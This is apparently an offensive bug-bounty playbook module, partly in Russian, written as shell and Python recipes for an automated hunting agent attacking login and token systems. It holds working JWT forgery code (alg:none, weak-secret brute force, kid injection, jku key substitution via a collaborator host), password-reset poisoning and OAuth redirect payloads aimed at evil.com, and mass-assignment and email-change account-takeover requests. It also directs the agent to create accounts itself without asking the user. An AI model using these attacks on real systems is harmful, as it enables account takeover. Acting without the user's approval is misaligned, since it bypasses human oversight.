# M3_AUTH_BYPASS — JWT · OAuth · ATO · Auth Bypass · Auto-Register
# Trigger: found JWT / OAuth endpoint / login / forgot-password / auth wall >50% endpoints

JWT_TOKEN="eyJ..."
TARGET="https://TARGET"
MY_EMAIL="my@controlled.com"
COLLAB_URL="xyz.oastify.com"   # interactsh IURL

## [B0] AUTO-REGISTER — do it yourself, don't ask user
# Scope-check FIRST: часть программ (MBANK, СберФакторинг и др.) запрещает temp-mail/авторегу/autoscan → тогда B0 пропускаем

# Step 1: temp mailbox (1secmail мёртв с 2024 → mail.tm, живой бесплатный REST API)
DOMAIN=$(curl -s https://api.mail.tm/domains | python3 -c "import sys,json;print(json.load(sys.stdin)['hydra:member'][0]['domain'])")
ADDR="hunt$RANDOM@$DOMAIN"; MPASS="HuntP@ss2026!"
curl -s -X POST https://api.mail.tm/accounts -H "Content-Type: application/json" -d "{\"address\":\"$ADDR\",\"password\":\"$MPASS\"}" >/dev/null
MTM=$(curl -s -X POST https://api.mail.tm/token -H "Content-Type: application/json" -d "{\"address\":\"$ADDR\",\"password\":\"$MPASS\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
echo "MAILBOX=$ADDR"

# Step 2: register on target
curl -sk -X POST "$TARGET/api/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ADDR\",\"password\":\"$MPASS\",\"name\":\"Test User\"}"

# Step 3: read inbox → confirmation link
sleep 8
curl -s https://api.mail.tm/messages -H "Authorization: Bearer $MTM" | python3 -m json.tool   # → MSG_ID
curl -s https://api.mail.tm/messages/MSG_ID -H "Authorization: Bearer $MTM"                    # → вытащить ссылку → открыть

# Step 4: login → get JWT
curl -sk -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ADDR\",\"password\":\"$MPASS\"}" | python3 -m json.tool
# → save JWT_TOKEN → add to ZAP Replacer → restart scans with auth

# If SMS required → ask user ONE line, keep working on other vectors
# Alt temp-mail: guerrillamail.com (api.guerrillamail.com/ajax.php), temp-mail.org; mailinator public API = paid
# Also try: /demo, /trial, /sandbox, default creds (admin:admin, test:test, demo:demo)

## [B1] JWT decode — first thing we do

python3 -c "
import base64, json, sys
tok = '$JWT_TOKEN'
parts = tok.split('.')
for i, p in enumerate(parts[:2]):
    p += '=' * (4 - len(p) % 4)
    print(['HEADER','PAYLOAD'][i], json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
"
# → Look at: alg / kid / jku / x5u / exp / role / user_id / sub / iss / aud
# EVERY field = attack vector
#

## [B2] alg:none — remove signature

python3 -c "
import base64, json
def enc(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
h = enc({'alg':'none','typ':'JWT'})
# Modify payload: role=admin, user_id=1
p = enc({'user_id':1,'role':'admin','is_admin':True,'exp':9999999999})
print(f'{h}.{p}.')
"
# → Test on /api/admin/* /api/profile /api/users/1
# Also try case/spacing: "None" "NONE" "nOnE" (блок-листы часто ловят только lowercase 'none')
# Бери ПОЛНЫЙ payload из [B1], меняй только role/user_id — выкинутые iss/aud/sub могут дать reject не из-за подписи

## [B3] HS256 weak secret — brute

python3 -c "
import hmac, hashlib, base64, sys
tok = '$JWT_TOKEN'
parts = tok.split('.')
msg = f'{parts[0]}.{parts[1]}'.encode()
import os
# бренд/продукт/стек-слова добавляй через: export WL_EXTRA='acme acme2026 acme-api ...'
for secret in ['secret','password','123456','admin','test','qwerty',
               'jwt_secret','api_secret','mysecret','dev','development',
               'prod','production','changeme','your-256-bit-secret'] + os.environ.get('WL_EXTRA','').split():
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == parts[2]:
        print('SECRET FOUND:', secret)
        sys.exit(0)
print('Not in quick list → try hashcat: hashcat -a 0 -m 16500 JWT rockyou.txt')
"

## [B4] kid injection

# kid: "../../dev/null" → sign with empty key ""
python3 -c "
import base64, json, hmac, hashlib
def enc(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
h = enc({'alg':'HS256','kid':'../../dev/null','typ':'JWT'})
p = enc({'user_id':1,'role':'admin','exp':9999999999})
msg = f'{h}.{p}'.encode()
sig = base64.urlsafe_b64encode(hmac.new(b'', msg, hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{h}.{p}.{sig}')
"

# kid SQL injection
python3 -c "
import base64, json, hmac, hashlib
def enc(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
h = enc({'alg':'HS256','kid':\"' UNION SELECT 'mykey'-- -\",'typ':'JWT'})
p = enc({'user_id':1,'role':'admin','exp':9999999999})
msg = f'{h}.{p}'.encode()
sig = base64.urlsafe_b64encode(hmac.new(b'mykey', msg, hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{h}.{p}.{sig}')
"

## [B4b] jku / x5u — подмена JWKS на свой ключ (P0 если принято)

# alg=RS256, jku → НАШ JWKS → сервер валидирует нашим pubkey → подпись нашим privkey проходит
# 1) openssl genrsa -out k.pem 2048; собрать JWKS {kty,n,e,kid:"mykey"} → положить на https://COLLAB_URL/jwks.json
# 2) header {"alg":"RS256","jku":"https://COLLAB_URL/jwks.json","kid":"mykey"}; payload role=admin из [B1]
# 3) подписать privkey → отправить → hit на COLLAB = сервер скачал jku → форж принят
# x5u = то же через URL x509-сертификата. jku allow-list bypass: https://TRUSTED@COLLAB_URL, https://COLLAB_URL#TRUSTED, TRUSTED.COLLAB_URL
#

## [B5] Auth bypass full

# Without token at all — 200 сам по себе НЕ P0 (SPA-shell/login тоже 200): проверяем тело на данные
for ep in api/users/me api/profile api/admin/dashboard api/admin/users \
          api/payments/history api/users/export api/admin api/internal; do
  R=$(curl -sk -w $'\n%{http_code}' "$TARGET/$ep"); CODE=$(printf '%s' "$R" | tail -1); BODY=$(printf '%s' "$R" | sed '$d')
  if [ "$CODE" = "200" ] && printf '%s' "$BODY" | grep -qiE '"(email|phone|id|user_?id|role|balance|token|ssn|iin)"'; then
    echo "[P0?] no-auth | /$ep | 200 + данные в теле → СВЕРИТЬ с authed-ответом перед сабмитом"
  fi
done

# Broken token
for tok in "INVALID" "null" "undefined" "0" "false" "" "true" "none" "Bearer"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/api/profile" \
    -H "Authorization: Bearer $tok")
  [ "$STATUS" = "200" ] && echo "[P0] broken-token | tok='$tok' | 200 on /api/profile"
done

# Token reuse after logout
SAVED="$JWT_TOKEN"
curl -sk -X POST "$TARGET/api/auth/logout" -H "Authorization: Bearer $SAVED" > /dev/null
STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/api/profile" \
  -H "Authorization: Bearer $SAVED")
[ "$STATUS" = "200" ] && echo "[P0] token-reuse | /api/profile | token alive after logout → ATO"

## [B6] Password Reset Poisoning → ATO

for header in "Host" "X-Forwarded-Host" "X-Host" "X-Original-Host" "X-Forwarded-Server"; do
  curl -sk -X POST "$TARGET/api/auth/forgot-password" \
    -H "$header: $COLLAB_URL" -H "Content-Type: application/json" \
    -d "{\"email\": \"$MY_EMAIL\"}" > /dev/null
  echo "Sent forgot-password with $header: $COLLAB_URL → check OOB"
done
# OOB-hit приходит когда жертва кликнет отравленную ссылку ИЛИ сервер сам резолвит Host (SSRF-подобно) — НЕ на момент отправки
# Чистый PoC: шлём reset на СВОЙ ящик ([B0]) и смотрим в письме, какой Host зашит в ссылку; отражается наш → ATO P0

## [B7] Reset token predictability

# Request reset twice → compare tokens
R1=$(curl -sk -X POST "$TARGET/api/auth/forgot-password" \
  -d '{"email":"my1@1secmail.com"}' -H "Content-Type: application/json" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token',''))" 2>/dev/null)
R2=$(curl -sk -X POST "$TARGET/api/auth/forgot-password" \
  -d '{"email":"my2@1secmail.com"}' -H "Content-Type: application/json" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token',''))" 2>/dev/null)
echo "Token 1: $R1"
echo "Token 2: $R2"
echo "Length: ${#R1}"
# MD5(timestamp)? Sequential? Shorter than 16 chars? → brute force
#

## [B8] OAuth attacks

# redirect_uri manipulation (HOST без схемы — иначе $TARGET даёт битое https://https://...)
HOST=$(printf '%s' "$TARGET" | sed -E 's#^https?://##')
for uri in "https://evil.com" "https://$HOST.evil.com/cb" "https://$HOST@evil.com" \
           "https://evil.com/.$HOST" "//evil.com" \
           "https://$HOST%2f%2e%2e%2fevil.com" "https://$HOST%40evil.com"; do
  LOC=$(curl -sk -o /dev/null -w "%{redirect_url}" \
    "$TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=$uri&response_type=code")
  echo "redirect_uri=$uri → Location: $LOC"
  echo "$LOC" | grep -q "evil.com" && echo "[P0] OAuth-redirect | redirect_uri=$uri | code will leak"
done

# state=missing → CSRF login
curl -sk "$TARGET/oauth/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=code" \
  -v 2>&1 | grep -i "state"

# scope escalation
curl -sk "$TARGET/oauth/authorize?client_id=CLIENT&scope=admin+openid+email&response_type=code" \
  -v 2>&1 | grep -i "scope\|state\|location"

## [B9] Mass assignment → ATO


# On registration
curl -sk -X POST "$TARGET/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "email":"attacker+test@test.com","password":"Pass123!",
    "role":"admin","is_admin":true,"is_staff":true,
    "is_verified":true,"email_verified":true,
    "plan":"enterprise","credits":99999
  }' | python3 -m json.tool | grep -E "role|admin|plan|verified"

# On profile update
curl -sk -X PATCH "$TARGET/api/profile" \
  -H "Authorization: Bearer $JWT_TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_admin":true,"is_staff":true,"plan":"premium"}' | \
  python3 -m json.tool | grep -E "role|admin|plan"

## [B10] Email / account IDOR → ATO

# Change email to own → reset password → account takeover
curl -sk -X PATCH "$TARGET/api/profile" \
  -H "Authorization: Bearer $JWT_TOKEN" -H "Content-Type: application/json" \
  -d "{\"email\": \"$MY_EMAIL\"}"

# Then reset for VICTIM_EMAIL (which is now ours)
curl -sk -X POST "$TARGET/api/auth/forgot-password" \
  -H "Content-Type: application/json" -d "{\"email\": \"$MY_EMAIL\"}"

## TRIGGERS

→ Found privesc via role=admin → Read "C:\HUNT CORE SYSTEM\M2_IDOR_BFLA.md" [A2] BFLA
→ Found SQL error in login → Read "C:\HUNT CORE SYSTEM\M4_INJECT.md" [I1] SQLi
→ SSRF via password reset → Read "C:\HUNT CORE SYSTEM\M4_INJECT.md" [I3] SSRF
